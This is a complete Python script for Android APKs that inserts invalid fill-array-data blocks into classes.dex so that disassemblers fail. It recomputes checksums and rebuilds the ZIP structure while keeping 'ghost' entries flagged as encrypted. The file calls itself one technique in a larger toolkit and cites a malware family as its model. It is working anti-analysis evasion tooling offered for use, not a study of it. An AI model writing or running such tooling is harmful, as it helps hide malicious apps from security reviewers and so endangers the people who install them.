#!/usr/bin/env python3
"""
nova_dex_poisoner.py — Nova DEX Bytecode Poisoner

Technique 6 — DEX Bytecode Poisoning (invalid element_width):
    Injects fill-array-data pseudo-instruction blocks with invalid
    element_width values appended to DEX data section. ART never
    executes them (unreachable). Disassemblers compute wrong payload
    lengths → disassembly fails.
    Confirmed: RatHat malware (Zimperium, September 2026).

CRITICAL: Uses raw byte ZIP rebuild — never calls zipfile.read() on
ghost entries (encryption bit 0x0801 set) to avoid RuntimeError.
Must run BEFORE final phase2_resign.

Usage:
    python3 scripts/nova_dex_poisoner.py <apk_in> <apk_out>
"""

import struct
import secrets
import random
import sys
import os
import zlib
import io

# ZIP signatures
LFH_SIG = 0x04034b50
CDH_SIG = 0x02014b50
EOCD_SIG = 0x06054b50

# DEX
DEX_MAGIC_PREFIX = b'dex\n'
FILL_ARRAY_IDENT = 0x0300
INVALID_WIDTHS   = [0x0003, 0x0005, 0x0006, 0x0007, 0x000F, 0x00FF, 0xFFFF]

TARGET = 'classes.dex'


def make_poison_block():
    ident         = FILL_ARRAY_IDENT
    element_width = random.choice(INVALID_WIDTHS)
    element_count = random.randint(4, 16)
    payload_size  = random.randint(8, 32)
    payload       = secrets.token_bytes(payload_size)
    if len(payload) % 2 != 0:
        payload += b'\x00'
    block  = struct.pack('<HHI', ident, element_width, element_count)
    block += payload
    return block


def poison_dex(dex_bytes):
    if len(dex_bytes) < 112:
        raise ValueError("DEX too small")
    if dex_bytes[:4] != DEX_MAGIC_PREFIX:
        raise ValueError(f"Not a DEX file: {dex_bytes[:4]}")

    dex = bytearray(dex_bytes)
    file_size = struct.unpack_from('<I', dex, 32)[0]

    n_blocks = random.randint(3, 6)
    poison   = bytearray()
    for _ in range(n_blocks):
        poison.extend(make_poison_block())
    while len(poison) % 4 != 0:
        poison += b'\x00'

    dex.extend(poison)
    new_file_size = len(dex)
    struct.pack_into('<I', dex, 32, new_file_size)

    # Recompute Adler-32 checksum
    new_checksum = zlib.adler32(bytes(dex[12:])) & 0xFFFFFFFF
    struct.pack_into('<I', dex, 8, new_checksum)

    print(f"[nova_dex_poisoner] Injected {n_blocks} poison blocks ({len(poison)} bytes)")
    print(f"[nova_dex_poisoner] DEX size: {file_size} → {new_file_size} bytes")

    return bytes(dex)


def read_raw_entries(apk_path):
    entries = []
    with open(apk_path, 'rb') as f:
        raw = f.read()

    pos = 0
    while pos < len(raw) - 4:
        sig = struct.unpack_from('<I', raw, pos)[0]
        if sig == LFH_SIG:
            version     = struct.unpack_from('<H', raw, pos+4)[0]
            flags       = struct.unpack_from('<H', raw, pos+6)[0]
            compress    = struct.unpack_from('<H', raw, pos+8)[0]
            mod_time    = struct.unpack_from('<H', raw, pos+10)[0]
            mod_date    = struct.unpack_from('<H', raw, pos+12)[0]
            crc32       = struct.unpack_from('<I', raw, pos+14)[0]
            comp_size   = struct.unpack_from('<I', raw, pos+18)[0]
            uncomp_size = struct.unpack_from('<I', raw, pos+22)[0]
            fname_len   = struct.unpack_from('<H', raw, pos+26)[0]
            extra_len   = struct.unpack_from('<H', raw, pos+28)[0]
            fname_bytes = raw[pos+30 : pos+30+fname_len]
            data_off    = pos + 30 + fname_len + extra_len
            comp_data   = raw[data_off : data_off+comp_size]
            fname_str   = fname_bytes.decode('utf-8', errors='replace')

            entries.append({
                'name':        fname_str,
                'fname_bytes': fname_bytes,
                'version':     version,
                'flags':       flags,
                'compress':    compress,
                'mod_time':    mod_time,
                'mod_date':    mod_date,
                'crc32':       crc32,
                'comp_size':   comp_size,
                'uncomp_size': uncomp_size,
                'comp_data':   comp_data,
            })
            pos = data_off + comp_size
        elif sig == CDH_SIG:
            break
        else:
            pos += 1

    return entries, raw


def patch_apk(apk_in, apk_out):
    entries, raw = read_raw_entries(apk_in)

    # Find and poison classes.dex
    poisoned_dex   = None
    dex_compress   = 8  # store DEX entry compress value — used in CDH update
    for e in entries:
        if e['name'] == TARGET:
            dex_compress = e['compress']
            if dex_compress == 8:
                dex_bytes = zlib.decompress(e['comp_data'], -15)
            else:
                dex_bytes = e['comp_data']
            poisoned_dex = poison_dex(dex_bytes)
            break

    if poisoned_dex is None:
        raise ValueError(f"{TARGET} not found in APK entries")

    # Find EOCD
    eocd_off = None
    for i in range(len(raw)-22, max(len(raw)-65558, -1), -1):
        if struct.unpack_from('<I', raw, i)[0] == EOCD_SIG:
            eocd_off = i
            break
    if eocd_off is None:
        raise ValueError("EOCD not found")

    cd_off  = struct.unpack_from('<I', raw, eocd_off+16)[0]
    cd_size = struct.unpack_from('<I', raw, eocd_off+12)[0]

    # Rebuild LFH section
    buf = io.BytesIO()
    local_offsets = {}

    for e in entries:
        local_offsets[e['name']] = buf.tell()
        fname_b = e['fname_bytes']

        if e['name'] == TARGET:
            if e['compress'] == 8:
                new_comp_data = zlib.compress(poisoned_dex, 6)[2:-4]
            else:
                new_comp_data = poisoned_dex
            new_crc       = zlib.crc32(poisoned_dex) & 0xFFFFFFFF
            new_comp_sz   = len(new_comp_data)
            new_uncomp_sz = len(poisoned_dex)

            lfh = struct.pack('<4sHHHHHIIIHH',
                b'PK\x03\x04',
                e['version'], e['flags'], e['compress'],
                e['mod_time'], e['mod_date'],
                new_crc, new_comp_sz, new_uncomp_sz,
                len(fname_b), 0)
            buf.write(lfh + fname_b + new_comp_data)
        else:
            lfh = struct.pack('<4sHHHHHIIIHH',
                b'PK\x03\x04',
                e['version'], e['flags'], e['compress'],
                e['mod_time'], e['mod_date'],
                e['crc32'], e['comp_size'], e['uncomp_size'],
                len(fname_b), 0)
            buf.write(lfh + fname_b + e['comp_data'])

    # Rebuild Central Directory
    cd_start = buf.tell()
    pos = cd_off
    cd_count = 0
    while pos < cd_off + cd_size:
        if struct.unpack_from('<I', raw, pos)[0] != CDH_SIG:
            break
        fname_len   = struct.unpack_from('<H', raw, pos+28)[0]
        extra_len   = struct.unpack_from('<H', raw, pos+30)[0]
        comment_len = struct.unpack_from('<H', raw, pos+32)[0]
        fname_bytes = raw[pos+46 : pos+46+fname_len]
        fname_str   = fname_bytes.decode('utf-8', errors='replace')
        entry_size  = 46 + fname_len + extra_len + comment_len

        if fname_str not in local_offsets:
            pos += entry_size
            continue

        cde = bytearray(raw[pos : pos+entry_size])

        if fname_str == TARGET:
            # Use dex_compress (stored before loop) — not e['compress'] which
            # refers to the last entry iterated, not classes.dex
            if dex_compress == 8:
                nc = zlib.compress(poisoned_dex, 6)[2:-4]
            else:
                nc = poisoned_dex
            struct.pack_into('<I', cde, 16, zlib.crc32(poisoned_dex) & 0xFFFFFFFF)
            struct.pack_into('<I', cde, 20, len(nc))
            struct.pack_into('<I', cde, 24, len(poisoned_dex))

        struct.pack_into('<I', cde, 42, local_offsets[fname_str])
        buf.write(bytes(cde))
        cd_count += 1
        pos += entry_size

    cd_end      = buf.tell()
    cd_size_new = cd_end - cd_start

    eocd_comment = raw[eocd_off+22:]
    eocd = struct.pack('<4sHHHHIIH',
        b'PK\x05\x06', 0, 0,
        cd_count, cd_count,
        cd_size_new, cd_start, len(eocd_comment))
    buf.write(eocd + eocd_comment)

    with open(apk_out, 'wb') as f:
        f.write(buf.getvalue())

    print(f"[nova_dex_poisoner] ✅ Done: {apk_out}")


def main():
    if len(sys.argv) < 3:
        print("Usage: nova_dex_poisoner.py <apk_in> <apk_out>")
        sys.exit(1)
    apk_in  = sys.argv[1]
    apk_out = sys.argv[2]
    if not os.path.isfile(apk_in):
        print(f"[nova_dex_poisoner] ERROR: input not found: {apk_in}")
        sys.exit(1)
    patch_apk(apk_in, apk_out)


if __name__ == '__main__':
    main()
